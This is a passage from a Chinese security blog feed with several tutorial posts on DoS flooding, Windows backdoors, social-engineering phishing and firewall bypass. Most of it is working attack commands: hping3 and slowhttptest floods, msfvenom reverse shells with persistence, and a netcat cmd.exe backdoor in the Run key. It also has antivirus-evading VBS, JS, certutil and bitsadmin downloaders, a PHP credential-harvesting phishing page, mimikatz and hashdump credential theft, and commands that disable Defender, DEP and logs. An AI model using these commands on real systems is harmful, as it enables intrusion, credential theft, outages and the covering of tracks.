python3-scapy</code></pre><pre class=" language-Linux"><code class="language-Linux">从gethub上下载：git clone https://github.com/EmreOvunc/Python-SYN-Flood-Attack-Tool.gitcd Python-SYN-Flood-Attack-Tool</code></pre><pre class=" language-Linux"><code class="language-Linux">lsls -lachmod 777 ./*# 更改执行权限</code></pre><pre class=" language-Linux"><code class="language-Linux">用Python去运行：python3 py3_synflood_cmd.py -t [目标ip：10.20.30.40] -p 8080 -c 5python3 py3_SYN-Flood.pypython SYN-Flood.py</code></pre><p><img src="/2022/03/24/android/image-20220111163648410.png" alt="image-20220111163648410"></p><h4 id="sockstress"><a href="#sockstress" class="headerlink" title="sockstress:"></a>sockstress:</h4><p><img src="/2022/03/24/android/image-20220111163805588.png" alt="image-20220111163805588"></p><p><img src="/2022/03/24/android/image-20220111163825703.png" alt="image-20220111163825703"></p><p>针对tcp服务，耗尽目标资源，建立大量的sock连接，不消耗网络资源<br>完成tcp3次握手，最后ack大小为0（即客户端不接收数据）<br>攻击者损耗很小<br>异步攻击，所以一台设备可以造成很大的效果<br>windows窗口实现流控（流量控制）</p><p>需要python2环境并且安装scapy</p><pre class=" language-Linux"><code class="language-Linux">./sockstress.py [目标ip] [端口号] [线程]</code></pre><h4 id="dns放大攻击"><a href="#dns放大攻击" class="headerlink" title="dns放大攻击:"></a>dns放大攻击:</h4><p>发送给dns的数据包94<br>返回的数据包大小160+</p><p>典型的流量放大攻击<br>单机带宽优势，以小汇多<br>利用协议的特性放大流量</p><pre class=" language-Linux"><code class="language-Linux">apt-get install dnsutils# 安装dig命令dig ANY qq.com @[dns的ip]dig ANY [目标域名（外网）] @[dns的服务器地址ip]# 利用回包判断dns服务器是否会被利用</code></pre><p><img src="/2022/03/24/android/image-20220111164722176.png" alt="image-20220111164722176"></p><h4 id="慢速攻击-打击网站有效果"><a href="#慢速攻击-打击网站有效果" class="headerlink" title="慢速攻击(打击网站有效果):"></a>慢速攻击(打击网站有效果):</h4><pre class=" language-Linux"><code class="language-Linux">apt-get install opensslapt-get install libssl-devapt-get install slowhttptest</code></pre><p><strong>slowhttptest</strong>软件原理：<br>低带宽应用层慢速DOS攻击（相对于cc慢）<br>擅长攻击apache tomcat…服务器</p><p><strong>Slowloris,slow http post</strong>攻击<br>耗尽应用并发的连接池，类似于http层的<strong>syn_flood</strong><br>http协议<strong>默认</strong>在服务端全部接收到请求之后才开始处理，如果客户发送的数据包慢速而且不完整，就会导致Dos</p><p><strong>Slowloris攻击</strong>:完整的http结尾是\r\n\r\n，它的攻击结尾\r\n<br><strong>slow http post</strong>攻击:http头部content-length声明长度，但是body缓慢发送</p><p><strong>slow http post</strong>慢速攻击(<strong>RUDY</strong>):</p><pre class=" language-Linux"><code class="language-Linux">slowhttptest -c 2000 -B -g -o body_states -i 110 -r 200 -s 8192 -t FAKEVERB -u http://192.168.1.214 -x 10 -p 3# -c 并发连接数# -H 默认攻击# -B http的post攻击、rudy攻击# -R 耗尽对方内存# -X 慢速读取# -o 把结果状态输出成一个文件# -i 中间停留时间# -l 持续攻击时间# -r 每秒建立连接数# -s 头部长度# -t 请求方式# -u URL# -f 需要什么样的头# -p 默认几秒没相应即判定已死亡</code></pre><p><strong>Slowloris</strong>攻击：</p><pre class=" language-Linux"><code class="language-Linux">slowhttptest -c 2000 -H -g -o my_header_states -i 10 -r 1000 -t GET -u http://192.168.1.214 -x 24 -p 3</code></pre><h3 id="hping3"><a href="#hping3" class="headerlink" title="hping3:"></a>hping3:</h3><p>定制发送任何的数据包</p><pre class=" language-Linux"><code class="language-Linux">-a   #伪造源地址-q   #不返回-n   #不解析域名-s   #源端口-d   #字节数-p   #端口--flood   #以flood方式攻击</code></pre><p>syn-flood</p><pre class=" language-Linux"><code class="language-Linux">hping3 -c 3000 -d 120 -S -w 64 -p 80 --flood --rand-source [目标ip]hping3 -S -P -p 80 --flood --rand-source [目标ip]</code></pre><p>tcp-flood</p><pre class=" language-Linux"><code class="language-Linux">hping3 -SARUFP -p 80 --flood --rand-source [目标ip]</code></pre><p>icmp-flood</p><pre class=" language-Linux"><code class="language-Linux">hping3 -q -n -a 1.1.1.1 --icmp -d 56 --flood [目标ip]</code></pre><p>udp-flood</p><pre class=" language-Linux"><code class="language-Linux">hping3 -a 1.1.1.1 --udp -s 53 -d 100 -p 53 --flood [目标ip]</code></pre><p>LAND<br>特殊的syn-flood攻击<br>源地址和目的地址都是受害者，自己和自己完成3次握手</p><pre class=" language-Linux"><code class="language-Linux">hping3 -n -a [目标ip] -S -d 100 -p 80 --flood [目标ip]</code></pre><p>TCP全链接DOS攻击</p><pre class=" language-Linux"><code class="language-Linux">nping --tcp-connect --rate=10000 -c 10000000 -q [目标ip]</code></pre><h3 id="siege攻击："><a href="#siege攻击：" class="headerlink" title="siege攻击："></a>siege攻击：</h3><pre class=" language-Linux"><code class="language-Linux">siege -i -c 1000000 [目标ip] -A httttttp</code></pre><h3 id="t50压力测试："><a href="#t50压力测试：" class="headerlink" title="t50压力测试："></a>t50压力测试：</h3><p>网络协议支持全面</p><pre class=" language-Linux"><code class="language-Linux">t50 -h    #可以查看参数t50 [目标网关] --flood --turbo -S --protocol TCP --dport 22t50 --flood --protocol TCP [目标ip] --dport 80</code></pre><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/">攻防世界WEB篇</a></li><li><a href="http://broken-year.github.io/2022/06/10/mysql-Authentication-bypass/">Mysql 身份认证绕过漏洞(CVE-2012-2122)</a></li><li><a href="http://broken-year.github.io/2022/06/07/xss-cookie/">Xss获取cookie</a></li><li><a href="https://blogs.kainy.cn/2010/09/用Gmail通讯录作为Android2.1手机联系人/">用Gmail通讯录作为Android2.1手机联系人</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> android </tag>
            
            <tag> 木马 </tag>
            
            <tag> DDOS </tag>
            
            <tag> 拒绝服务攻击 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>系统后门</title>
      <link href="/2022/03/24/back-door/"/>
      <url>/2022/03/24/back-door/</url>
      
        <content type="html"><![CDATA[<h1 id="认识系统后门"><a href="#认识系统后门" class="headerlink" title="认识系统后门"></a>认识系统后门</h1><h2 id="meterpreter创建系统后门"><a href="#meterpreter创建系统后门" class="headerlink" title="meterpreter创建系统后门"></a>meterpreter创建系统后门</h2><ol><li>创建x64木马</li></ol><pre class=" language-Linux"><code class="language-Linux">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.120 lport=4444 -f exe > msf.exe</code></pre><ol start="2"><li>生成木马后，放到桌面上。</li></ol><pre class=" language-Linux"><code class="language-Linux">use exploit/multi/handlerset payload windows/metsvc_bind_tcpshow optionsset lport 192.168.1.120exploit</code></pre><p>上述木马是运行在内存里的，可以通过关闭进程然后干掉木马。</p><ol start="3"><li><strong>通过服务启动</strong>：</li></ol><pre class=" language-Linux"><code class="language-Linux">run metsvc -A    # 设定端口上传后门文件</code></pre><p>【会开启一个31337端口，然后木马存在于C:\Users\ADMINI~1\APPData\Local\Teemp\FWnOkowKpbzilqs】</p><ol start="4"><li><strong>如何利用后门</strong>:</li></ol><pre class=" language-Linux"><code class="language-Linux">use exploit/multi/handlerset payload windows/metsvc_bind_tcpset lport 31337set rhost [对方的ip]exploit</code></pre><ol start="5"><li><p><strong>或</strong>：<strong>在session中启动利用后门</strong></p><pre class=" language-Linux"><code class="language-Linux">run persistence -A -S -U -i 60 -p 4321 -r [黑客ip]# 安插一个永久性后门，60s上线一次，使用4321端口sessions# 发现多了一个session6sessions -i 6# 进入sessiongetuidgetsystemgetuid# 然后重启/注销</code></pre></li></ol><p>【如果msf关闭了，下次重开】</p><pre class=" language-Linux"><code class="language-Linux">use multi/handlerset payload windows/meterpreter/reverse_tcpset lport 4321set lhost [自己ip]exploit</code></pre><ol start="7"><li>重启回来登录后，我们再重开msf，也可以监听。</li><li>即使<code>sessions -k [id] </code>【干掉session id后】，过了60s还会回来</li></ol><h2 id="利用上传文件安插后门："><a href="#利用上传文件安插后门：" class="headerlink" title="利用上传文件安插后门："></a>利用上传文件安插后门：</h2><p>安插木马后</p><p>利用nc：</p><p>进入一个session中：</p><pre class=" language-Linux"><code class="language-Linux">upload /root/nc.exe c:\\</code></pre><p>查看注册表里有什么：</p><pre class=" language-Linux"><code class="language-Linux">reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run</code></pre><p>把nc放到自动启动里：</p><pre class=" language-Linux"><code class="language-Linux">reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc -d 'c:\nc.exe -Ldp 444 -e cmd.exe'</code></pre><p>查看代码写的对不对：</p><pre class=" language-Linux"><code class="language-Linux">reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc</code></pre><p>查看防火墙状态：</p><pre class=" language-Linux"><code class="language-Linux">shellnetsh firewall show opmode</code></pre><p>添加一个防火墙规则允许444端口通过：</p><pre class=" language-Linux"><code class="language-Linux">shnetsh firewall add portopening TCP 444 "FireWall" ENABLE ALL</code></pre><p>目标主机重启之后：</p><pre class=" language-Linux"><code class="language-Linux">nc -v [目标ip] 444</code></pre><p>然后即可连接上。</p><h2 id="拓展："><a href="#拓展：" class="headerlink" title="拓展："></a>拓展：</h2><p>注册表修改的内容可以在msconfig的启动选项卡里看到<br>可以考虑使用自解压的方法进行伪装…</p><p><strong>黑客操作的关键</strong>：利用合法软件去进行操作</p><p><strong>下载的本质</strong>：把对方服务器上所存放的二进制代码原封不动地根据http 协议或其他协议复制到自己的硬盘上。</p><h2 id="使用vbs去远程下载文件"><a href="#使用vbs去远程下载文件" class="headerlink" title="使用vbs去远程下载文件:"></a>使用vbs去远程下载文件:</h2><p>比如在自己网页上创建一个haha.txt文件当作木马。</p><p>创建一个a.vbs：</p><pre class=" language-vbscript"><code class="language-vbscript">set a=createobject("adod"+"b.stream"):set w=createobject("micro"+"soft.xmlhttp"):w.open"get",wsh.arguments(0),0:w.send:a.type=1:a.open:a.write w.responsebody:a.savetofile wsh.arguments(1),2# 创建对象a【"adod"+"b.stream"等同于adodb.stream，拆分是为了免杀】# get传输# 参数为0# 表示下载0，保存到1的地方</code></pre><p>cmd运行：</p><pre class=" language-bash"><code class="language-bash">cscript a.vbs http://www.xx.com/haha.txt c:\b.txtcscript a.vbs <span class="token punctuation">[</span>参数0：http://www.xx.com/haha.txt<span class="token punctuation">]</span> <span class="token punctuation">[</span>参数1：c:\b.txt<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># 下载0保存到1</span></code></pre><p>或cmd使用echo直接写：</p><pre class=" language-Linux"><code class="language-Linux">echo set a=createobject("adod"+"b.stream"):set w=createobject("micro"+"soft.xmlhttp"):w.open"get",wsh.arguments(0),0:w.send:a.type=1:a.open:a.write w.responsebody:a.savetofile wsh.arguments(1),2 >> a.vbs</code></pre><p>容易被杀毒软件查到</p><h2 id="cmd-certutil下载文件："><a href="#cmd-certutil下载文件：" class="headerlink" title="cmd,certutil下载文件："></a>cmd,certutil下载文件：</h2><pre class=" language-Linux"><code class="language-Linux">certutil -urlcache -split -f http://www.xx.com/haha.txt# 会下载到本目录</code></pre><p>有一个弊端：<br>每次下载的时候，都有留存，导致留下入侵痕迹，所以每次下载之后，都要清理痕迹:</p><pre class=" language-Linux"><code class="language-Linux">certutil -urlcache -split -f http://www.xx.com/haha.txt delete</code></pre><p>除了下载文件还可以校验hash值：</p><pre class=" language-Linux"><code class="language-Linux">certutil -hashfile c:\xxx.exe</code></pre><p>如果文件被动过，hash值就会改变</p><p>除了下载文件还可以加密解密文件：</p><pre class=" language-Linux"><code class="language-Linux">certutil -encode c:\haha.txt c:\haha-en.txtcertutil -decode c:\haha-en.txt c:\haha-de.txt</code></pre><h2 id="使用cmd-bitsadmin下载："><a href="#使用cmd-bitsadmin下载：" class="headerlink" title="使用cmd,bitsadmin下载："></a>使用cmd,bitsadmin下载：</h2><p>下载主命令：</p><pre class=" language-Linux"><code class="language-Linux">bitsadmin /rawreturn /transfer down http://www.xx.com/haha.txt c:\haha.txt</code></pre><p>提高下载主命令的优先级（下载大型文件）:</p><pre class=" language-Linux"><code class="language-Linux">bitsadmin /setpriority down foreground</code></pre><h2 id="使用js下载："><a href="#使用js下载：" class="headerlink" title="使用js下载："></a>使用js下载：</h2><p>创建一个a.js</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> WinHttpReq <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ActiveXObject</span><span class="token punctuation">(</span><span class="token string">"WinHttp.WinHttpRequest.5.1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>WinHttpReq<span class="token punctuation">.</span><span class="token function">Open</span><span class="token punctuation">(</span><span class="token string">"GET"</span><span class="token punctuation">,</span>WScript<span class="token punctuation">.</span><span class="token function">Arguments</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">/*async=*/</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>WinHttpReq<span class="token punctuation">.</span><span class="token function">Send</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  # 发送请求WScript<span class="token punctuation">.</span><span class="token function">Echo</span><span class="token punctuation">(</span>WinHttpReq<span class="token punctuation">.</span>ResponseText<span class="token punctuation">)</span><span class="token punctuation">;</span>  # 返回# 然后cmd：cscript <span class="token operator">/</span>nologo a<span class="token punctuation">.</span>js http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>xx<span class="token punctuation">.</span>com<span class="token operator">/</span>haha<span class="token punctuation">.</span>txt <span class="token operator">></span><span class="token operator">></span> <span class="token number">123</span><span class="token punctuation">.</span>txt# 适用于下载脚本</code></pre><p>创建一个a.js下载后直接保存为文件:</p><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> WinHttpReq <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ActiveXObject</span><span class="token punctuation">(</span><span class="token string">"WinHttp.WinHttpRequest.5.1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>WinHttpReq<span class="token punctuation">.</span><span class="token function">Open</span><span class="token punctuation">(</span><span class="token string">"GET"</span><span class="token punctuation">,</span>WScript<span class="token punctuation">.</span><span class="token function">Arguments</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">/*async=*/</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>WinHttpReq<span class="token punctuation">.</span><span class="token function">Send</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>BinStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ActiveXObject</span><span class="token punctuation">(</span><span class="token string">"ADODB.Stream"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>BinStream<span class="token punctuation">.</span>Type <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>BinStream<span class="token punctuation">.</span><span class="token function">Open</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>BinStream<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span>WinHttpReq<span class="token punctuation">.</span>ResponseBody<span class="token punctuation">)</span><span class="token punctuation">;</span>BinStream<span class="token punctuation">.</span><span class="token function">SaveToFile</span><span class="token punctuation">(</span><span class="token string">"abc.exe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span># cmd：cscript <span class="token operator">/</span>nologo a<span class="token punctuation">.</span>js http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>xx<span class="token punctuation">.</span>com<span class="token operator">/</span>aa<span class="token punctuation">.</span>exe</code></pre><p>较可靠</p><h2 id="使用ftp脚本"><a href="#使用ftp脚本" class="headerlink" title="使用ftp脚本:"></a>使用ftp脚本:</h2><p>创建一个a.bat</p><pre class=" language-Linux"><code class="language-Linux">echo open [黑客ip] > ftp.txtecho test>>ftp.txtecho 123>>ftp.txtecho binary>> ftp.txtecho get haha.txt>> ftp.txtecho bye >> ftp.txt</code></pre><p>创建一个haha.txt</p><pre class=" language-Linux"><code class="language-Linux">*CODE:\</code></pre><p>双击bat文件会得到一个txt文件。</p><p>然后再cmd里把得到的txt文件内容当作一个脚本去执行：</p><pre class=" language-Linux"><code class="language-Linux">ftp -s:ftp.txt</code></pre><h2 id="kali的meterpreter其他命令："><a href="#kali的meterpreter其他命令：" class="headerlink" title="kali的meterpreter其他命令："></a>kali的meterpreter其他命令：</h2><pre class=" language-Linux"><code class="language-Linux">uictl [enable/disable] [keyboard/mouse/all]   # 开启/停用键盘/鼠标webcam_list    # 查看摄像头webcam_snap    # 通过摄像头拍照webcam_stream   # 通过摄像头开启视频execute    # 在目标上执行文件execute -H -i -f [exe文件]    # 创建新的隐藏、可交互的、命令：.execmd.exeexecute -H -i -f cmd.exe    # 创建新的隐藏、可交互的、命令：cmd.exegetpid    # 获取当前进程的pid【进程的id】ps     # 查看活跃进程migrate [pid]    # 将meterpreter转移到某个pid中[附着]kill [pid]     # 杀死某个进程clearev    # 清除日志，清除windows里的应用程序日志、系统日志、安全日志。但会留下痕迹timestomp -v c://a.exe    # 查看c盘的a.exe的时间戳timestomp c://b.exe -f c://a.exe    # 将a.exe的时间戳复制给b.exe</code></pre><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/">攻防世界WEB篇</a></li><li><a href="http://broken-year.github.io/2022/06/10/mysql-Authentication-bypass/">Mysql 身份认证绕过漏洞(CVE-2012-2122)</a></li><li><a href="http://broken-year.github.io/2022/06/07/xss-cookie/">Xss获取cookie</a></li><li><a href="https://blogs.kainy.cn/2010/09/CallVerifID（phonefactor）电话登陆认证方法/">CallVerifID（phonefactor）电话登陆认证方法</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 后门 </tag>
            
            <tag> msf </tag>
            
            <tag> 渗透 </tag>
            
            <tag> windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>社会工程学</title>
      <link href="/2022/03/24/social-engineering/"/>
      <url>/2022/03/24/social-engineering/</url>
      
        <content type="html"><![CDATA[<h1 id="社会工程学认识"><a href="#社会工程学认识" class="headerlink" title="社会工程学认识"></a>社会工程学认识</h1><h2 id="网络钓鱼："><a href="#网络钓鱼：" class="headerlink" title="网络钓鱼："></a>网络钓鱼：</h2><p>使用网站克隆工具<br>实在不行，用手写</p><p>PHPstudy</p><p>新建php文件：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'TextBoxUserName'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'TextBoxPwd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$txt</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">.</span><span class="token string">'----'</span><span class="token punctuation">.</span><span class="token variable">$password</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">'./haha.txt'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token shell-comment comment"># 保存到文件</span><span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token variable">$txt</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token shell-comment comment"># 写入内容</span><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token shell-comment comment"># 关闭文件</span><span class="token function">header</span><span class="token punctuation">(</span>"location<span class="token punctuation">:</span>https<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//login.cnki.net/login/?platform=kns&amp;ForceReLogin=1&amp;ReturnURL=https://www.cnki.net/");</span><span class="token shell-comment comment">## 跳转页面</span><span class="token delimiter">?></span></code></pre><p>右键另存为，保存正版网页到：</p><p>PHPstudy的www文件里</p><p>改文件夹名及格式：</p><p><img src="/2022/03/24/social-engineering/image-20220110205021816.png" alt="image-20220110205021816"></p><p><img src="/2022/03/24/social-engineering/image-20220110205040133.png" alt="image-20220110205040133"></p><p>F12，对比正版和本地网站的显示，然后下载缺失部分到www的文件夹里。</p><p>寻找登录提交的相关代码，进行修改，并设置跳转页面。</p><h2 id="电话钓鱼："><a href="#电话钓鱼：" class="headerlink" title="电话钓鱼："></a>电话钓鱼：</h2><p><a href="https://www.spoofbox.com/zh">https://www.spoofbox.com/zh</a><br>网络电话、假来电显示</p><p>skype软件</p><h2 id="伪装模拟："><a href="#伪装模拟：" class="headerlink" title="伪装模拟："></a>伪装模拟：</h2><p>防止人家使用社工手段追踪自己。</p><p>安全指数最高的邮箱<br>mail.protonmail.com</p><p>10分钟邮箱</p><p>短信接码平台</p><p>注册国外的产品:<br>购买&#x2F;注册google voice(gv)帐号(送你一个美国本土的电话)</p><p>自己制作网站：<br>vps(网页 vpn)<br>【cloudflare只能帮你防御80和443端口的攻击和追踪】</p><h2 id="个人信息搜集："><a href="#个人信息搜集：" class="headerlink" title="个人信息搜集："></a>个人信息搜集：</h2><p>策略</p><p>盗号 qq 微信 博客 微博 社区 贴吧 开房记录 外卖 快递 手机app<br>统称：社工库<br>人轨</p><p>qq–&gt;手机号–&gt;支付宝</p><p>群关系，学校，同学关系</p><p>3D面部建模（证件照，身份证，护照……）</p><p>简历，公司关系查询</p><h2 id="渗透到对方的服务器之后："><a href="#渗透到对方的服务器之后：" class="headerlink" title="渗透到对方的服务器之后："></a>渗透到对方的服务器之后：</h2><p>cmd–mmc–事件查看器</p><p><img src="/2022/03/24/social-engineering/image-20220110212904449.png"></p><p>（删除日志这件事本身就是一个日志，而且日志理论上无法单条删除）</p><p>关于清除日志：</p><p>meterpreter—clearev</p><h2 id="vultr的安全操作"><a href="#vultr的安全操作" class="headerlink" title="vultr的安全操作"></a>vultr的安全操作</h2><p>vultr—使用kali的live模式–关闭ssh–直接使用网页连接(中国ip–美国vpn–vultr公司ip–内部网络操作kali-live)</p><h2 id="限制下载速度的匿名网盘——传输文件："><a href="#限制下载速度的匿名网盘——传输文件：" class="headerlink" title="限制下载速度的匿名网盘——传输文件："></a>限制下载速度的匿名网盘——传输文件：</h2><p><a href="https://anonfiles.com/">https://anonfiles.com/</a></p><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/">攻防世界WEB篇</a></li><li><a href="http://broken-year.github.io/2022/06/10/mysql-Authentication-bypass/">Mysql 身份认证绕过漏洞(CVE-2012-2122)</a></li><li><a href="http://broken-year.github.io/2022/06/07/xss-cookie/">Xss获取cookie</a></li><li><a href="https://blogs.kainy.cn/2010/09/CallVerifID（phonefactor）电话登陆认证方法/">CallVerifID（phonefactor）电话登陆认证方法</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 信息搜集 </tag>
            
            <tag> 社会工程学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>系统防火墙原理及突破</title>
      <link href="/2022/03/23/fire-wall/"/>
      <url>/2022/03/23/fire-wall/</url>
      
        <content type="html"><![CDATA[<h1 id="系统防火墙原理及突破"><a href="#系统防火墙原理及突破" class="headerlink" title="系统防火墙原理及突破"></a>系统防火墙原理及突破</h1><h2 id="数据和嗅探："><a href="#数据和嗅探：" class="headerlink" title="数据和嗅探："></a>数据和嗅探：</h2><p>目标电脑上msf运行木马后</p><pre class=" language-Linux"><code class="language-Linux">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.120 lport=4444 -f exe -o msf.exeuse exploit/muti/handlerset payload windows/x64/meterpreter/reverse_tcpshow optionsset lhost 192.168.1.120exploit</code></pre><p>提权</p><pre class=" language-Linux"><code class="language-Linux">getuidgetsystemgetuid</code></pre><h3 id="对数据包的操作"><a href="#对数据包的操作" class="headerlink" title="对数据包的操作"></a>对数据包的操作</h3><p>进入session</p><pre class=" language-Linux"><code class="language-Linux">load sniffer    # 加载嗅探模块sniffer_interfaces     # 查看电脑网卡sniffer_start 2      # 对2号网卡进行嗅探操作，监听sniffer_dump 2 2.cap    # 把2号网卡的数据包下载下来保存为/root/2.capwireshark 2.cap    # 使用wireshark查看抓到的包sniffer_stop 2    # 停止对2号网卡的嗅探</code></pre><h2 id="host-注入——伪造域名"><a href="#host-注入——伪造域名" class="headerlink" title="host 注入——伪造域名"></a>host 注入——伪造域名</h2><p>msf</p><p>提权到系统最高权限，</p><p>然后进行如下操作：</p><pre class=" language-Linux"><code class="language-Linux">use post/windows/manage/inject_host   # 使用注入模块show optionsset IP [自己的ip]     # 这里的ip是之后目标指向的ipset DOMAIN [要篡改的域名]    # 要伪造什么域名set SESSION [session-id]    # 对哪个session-id进行修改exploit</code></pre><p>实质是修改了本机操控的木马所在电脑的host文件</p><h2 id="用户认证钓鱼窗口"><a href="#用户认证钓鱼窗口" class="headerlink" title="用户认证钓鱼窗口"></a>用户认证钓鱼窗口</h2><p>进入sesion中</p><pre class=" language-Linux"><code class="language-Linux">run post/windows/gather/phish_windows_credentials</code></pre><p>这个时候管理员的桌面会出现认证窗口（假的）</p><p>然后我们就可截获其用户名和密码。</p><h2 id="passTheHash"><a href="#passTheHash" class="headerlink" title="passTheHash:"></a>passTheHash:</h2><p>必须是system权限<br>进入一个session</p><pre class=" language-Linux"><code class="language-Linux">run post/windows/gather/hashdump    # 获得操作系统的用户hash值</code></pre><p>即可以获取到管理员密码加密之后的密码，之后使用穷举的方法破解【使用彩虹表等】【或使用猕猴桃】</p><h2 id="使用猕猴桃-32位-："><a href="#使用猕猴桃-32位-：" class="headerlink" title="使用猕猴桃(32位)："></a>使用猕猴桃(32位)：</h2><p>实质利用lsass.exe本地安全认证进程，达到获得用户登录密码。</p><p>连接木马：</p><pre class=" language-Linux"><code class="language-Linux">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.120 lport=4444 -f exe -o msf.exeuse exploit/multi/handlerset payload windows/x64/meterpreter/reverse_tcpshow optionsset lhost 192.168.1.120exploitgetuidgetsystemgetuid</code></pre><p>进入session加载猕猴桃：</p><pre class=" language-Linux"><code class="language-Linux">load mimikatz(或load kiwi)   # 加载猕猴桃help kiwi   # 查看猕猴桃的命令creds_all    # 列出所有的凭据（得到LM,NTLM等即密码明文）creds_kerberos     # 拿到所有密码creds_msv     # 只列出当前用户加密之后的密码</code></pre><p><strong>电脑版本的猕猴桃软件</strong>：通过获取内存内容得到答案</p><p>扫雷外挂（Windows2003，Windows7）:</p><pre class=" language-Linux"><code class="language-Linux">winmine::infos</code></pre><h2 id="防火墙和3389端口："><a href="#防火墙和3389端口：" class="headerlink" title="防火墙和3389端口："></a>防火墙和3389端口：</h2><h3 id="正常打开-x2F-关闭防火墙："><a href="#正常打开-x2F-关闭防火墙：" class="headerlink" title="正常打开&#x2F;关闭防火墙："></a>正常打开&#x2F;关闭防火墙：</h3><p><img src="/2022/03/23/fire-wall/image-20220110182306171.png" alt="image-20220110182306171"></p><h3 id="命令行打开-x2F-关闭防火墙"><a href="#命令行打开-x2F-关闭防火墙" class="headerlink" title="命令行打开&#x2F;关闭防火墙"></a>命令行打开&#x2F;关闭防火墙</h3><p>kali操纵木马对windows进行操作</p><pre class=" language-Linux"><code class="language-Linux">shell   #进入到命令行到C:\Windows\system32目录下</code></pre><pre class=" language-Linux"><code class="language-Linux">whoami   #查看是否为系统权限</code></pre><p><strong>关闭防火墙</strong></p><pre class=" language-Linux"><code class="language-Linux">netsh advfirewall set allprofiles state off</code></pre><p><strong>关闭defener</strong></p><pre class=" language-Linux"><code class="language-Linux">net stop windefend</code></pre><p><strong>关闭dep(数据执行保护)</strong></p><pre class=" language-Linux"><code class="language-Linux">bcdedit.exe /set &#123;current&#125; nx AlwaysOff</code></pre><p><strong>退出命令行返回到msf里</strong>：</p><pre class=" language-Linux"><code class="language-Linux">exit</code></pre><p>回到meterpreter的木马里</p><p><strong>关闭杀毒软件</strong></p><pre class=" language-Linux"><code class="language-Linux">run killav(run post/windows/manage/killav)</code></pre><p>大多数关闭国外杀毒软件</p><h3 id="关于远程连接——在木马被杀掉后能有后门进行连接"><a href="#关于远程连接——在木马被杀掉后能有后门进行连接" class="headerlink" title="关于远程连接——在木马被杀掉后能有后门进行连接"></a>关于远程连接——在木马被杀掉后能有后门进行连接</h3><p>一般情况：</p><p>在我的电脑右键属性里可以设置</p><p>可以看到目标主机上cmd后</p><pre class=" language-Linux"><code class="language-Linux">netstat -ano    # 查看端口状态# 